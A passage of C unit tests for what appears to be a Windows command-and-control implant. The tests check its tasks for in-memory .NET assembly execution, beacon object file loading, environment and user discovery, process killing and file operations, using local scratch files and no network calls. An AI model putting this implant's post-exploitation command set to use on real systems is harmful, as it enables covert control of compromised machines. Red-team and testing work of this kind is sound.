        static const unsigned char junk[] = {0x4d, 0x5a, 0x90, 0x00};
        out = NULL;
        CHECK(coff_run(junk, sizeof(junk), "go", coff_test_args,
                       sizeof(coff_test_args), 5, &out) != 0,
              "coff junk object fails");
        CHECK(out && strstr(out, "bad coff") != NULL, "coff junk error text");
        free(out);
    }
}

static void test_exec_errors(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    /* Dispatch-level validation, no network involved. */
    if (command_in_list(CFG_COMMANDS, "execute_assembly")) {
        run_task(a, "execute_assembly", "{}", &resp, &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "no assembly file id") != NULL,
              "execute_assembly needs file, got %s", resp.status ? resp.status : "(null)");
        task_cleanup(&resp, &output);
    }
    if (command_in_list(CFG_COMMANDS, "execute_coff")) {
        run_task(a, "execute_coff", "{\"function_name\": \"go\"}", &resp, &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "no bof file id") != NULL,
              "execute_coff needs file, got %s", resp.status ? resp.status : "(null)");
        task_cleanup(&resp, &output);
        run_task(a, "execute_coff", "{\"bof_file\": \"u\", \"coff_arguments\": \"zz\"}", &resp,
                 &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "bad coff_arguments") != NULL,
              "execute_coff bad hex, got %s", resp.status ? resp.status : "(null)");
        task_cleanup(&resp, &output);
        run_task(a, "execute_coff",
                 "{\"bof_file\": \"u\", \"coff_arguments\": \"02000000ffff00\"}", &resp, &output,
                 &exit_now);
        CHECK(resp.status && strstr(resp.status, "bad coff_arguments") != NULL,
              "execute_coff total mismatch, got %s", resp.status ? resp.status : "(null)");
        task_cleanup(&resp, &output);
    }
    /* Direct CLR failure path with a non-assembly file (wine and Windows
     * alike fail, naming the clr stage). */
    {
        char dir[MAX_PATH], path[MAX_PATH * 2];
        FILE *f;
        char *out = NULL;
        GetTempPathA(sizeof(dir), dir);
        snprintf(path, sizeof(path), "%serltest-notasm.tmp", dir);
        f = fopen(path, "wb");
        CHECK(f != NULL, "execasm scratch file");
        if (f) {
            fwrite("not-an-assembly", 1, 15, f);
            fclose(f);
            CHECK(execasm_run(path, "", &out) != 0, "execasm garbage fails");
            CHECK(out && strstr(out, "error: clr:") != NULL, "execasm clr error text, got %s",
                  out ? out : "(null)");
            free(out);
            DeleteFileA(path);
        }
    }
}

static void test_wave1(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    if (!command_in_list(CFG_COMMANDS, "whoami")) {
        run_task(a, "whoami", "", &resp, &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "whoami excluded");
        task_cleanup(&resp, &output);
        return;
    }
    run_task(a, "whoami", "", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "whoami status %s", resp.status);
    CHECK(resp.user_output && resp.user_output[0] != '\0', "whoami output");
    task_cleanup(&resp, &output);
    SetEnvironmentVariableA("ERLIKHAN_PROBE", "probe-value");
    run_task(a, "env", "", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "env status %s", resp.status);
    CHECK(resp.user_output && strstr(resp.user_output, "ERLIKHAN_PROBE=probe-value") != NULL,
          "env output");
    task_cleanup(&resp, &output);
    run_task(a, "pwd", "", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "pwd status %s", resp.status);
    CHECK(resp.user_output && resp.user_output[0] != '\0', "pwd output");
    {
        /* cd round-trip with restore, so later tests keep their cwd. */
        char *saved = resp.user_output ? _strdup(resp.user_output) : NULL;
        task_cleanup(&resp, &output);
        run_task(a, "mkdir", "t_cd_x", &resp, &output, &exit_now);
        task_cleanup(&resp, &output);
        run_task(a, "cd", "t_cd_x", &resp, &output, &exit_now);
        CHECK(strcmp(resp.status, "success") == 0, "cd status %s", resp.status);
        CHECK(resp.user_output && strstr(resp.user_output, "t_cd_x") != NULL, "cd output, got %s",
              resp.user_output ? resp.user_output : "(null)");
        task_cleanup(&resp, &output);
        if (saved) {
            run_task(a, "cd", saved, &resp, &output, &exit_now);
            CHECK(strcmp(resp.status, "success") == 0, "cd restore %s", resp.status);
            task_cleanup(&resp, &output);
            free(saved);
        }
        run_task(a, "rm", "t_cd_x", &resp, &output, &exit_now);
        task_cleanup(&resp, &output);
    }
    run_task(a, "cd", "", &resp, &output, &exit_now);
    CHECK(resp.status && strstr(resp.status, "usage") != NULL, "cd empty usage, got %s",
          resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
    {
        /* cp/mv round-trip on a test-created file. */
        FILE *f = fopen("t_cp_src.txt", "wb");
        CHECK(f != NULL, "cp source file");
        if (f) {
            fwrite("payload", 1, 7, f);
            fclose(f);
        }
        run_task(a, "cp", "{\"source\": \"t_cp_src.txt\", \"destination\": \"t_cp_dst.txt\"}",
                 &resp, &output, &exit_now);
        CHECK(strcmp(resp.status, "success") == 0, "cp status %s", resp.status);
        CHECK(resp.user_output && strstr(resp.user_output, "copied") != NULL, "cp output");
        task_cleanup(&resp, &output);
        CHECK(GetFileAttributesA("t_cp_dst.txt") != INVALID_FILE_ATTRIBUTES, "cp result exists");
        run_task(a, "mv", "{\"source\": \"t_cp_dst.txt\", \"destination\": \"t_cp_mv.txt\"}", &resp,
                 &output, &exit_now);
        CHECK(strcmp(resp.status, "success") == 0, "mv status %s", resp.status);
        task_cleanup(&resp, &output);
        CHECK(GetFileAttributesA("t_cp_mv.txt") != INVALID_FILE_ATTRIBUTES, "mv result exists");
        CHECK(GetFileAttributesA("t_cp_dst.txt") == INVALID_FILE_ATTRIBUTES, "mv removes source");
        run_task(a, "cp", "{\"source\": \"t_cp_missing.txt\", \"destination\": \"t_cp_x.txt\"}",
                 &resp, &output, &exit_now);
        CHECK(resp.status && strncmp(resp.status, "error:", 6) == 0, "cp missing errors, got %s",
              resp.status ? resp.status : "(null)");
        task_cleanup(&resp, &output);
        run_task(a, "mv", "{\"source\": \"only\"}", &resp, &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "usage") != NULL, "mv partial usage, got %s",
              resp.status ? resp.status : "(null)");
        task_cleanup(&resp, &output);
        DeleteFileA("t_cp_src.txt");
        DeleteFileA("t_cp_dst.txt");
        DeleteFileA("t_cp_mv.txt");
        DeleteFileA("t_cp_x.txt");
    }
    run_task(a, "ipconfig", "", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "ipconfig status %s", resp.status);
    CHECK(resp.user_output && strstr(resp.user_output, "host: ") != NULL, "ipconfig output");
    task_cleanup(&resp, &output);
    run_task(a, "uptime", "", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "uptime status %s", resp.status);
    CHECK(resp.user_output && strncmp(resp.user_output, "uptime ", 7) == 0, "uptime output, got %s",
          resp.user_output ? resp.user_output : "(null)");
    task_cleanup(&resp, &output);
}

int main(int argc, char **argv) {
    agent_t a;
    if (argc > 1 && strcmp(argv[1], "--hang") == 0) {
        Sleep(30000);
        return 0;
    }
    memset(&a, 0, sizeof(a));
    test_command_in_list();
    test_xfer_chunk_size();
    test_post_reply_find();
    test_exit_unknown(&a);
    test_sleep(&a);
    test_shell(&a);
    test_ls(&a);
    test_ls_json(&a);
    test_rm_mkdir(&a);
    test_transfer_errors(&a);
    test_ps_kill(&a);
    test_load_unload(&a);
    test_coff_fixture();
    test_exec_errors(&a);
    test_wave1(&a);
    if (failures == 0)
        printf("tasks: all pass\n");
    return failures != 0;
}
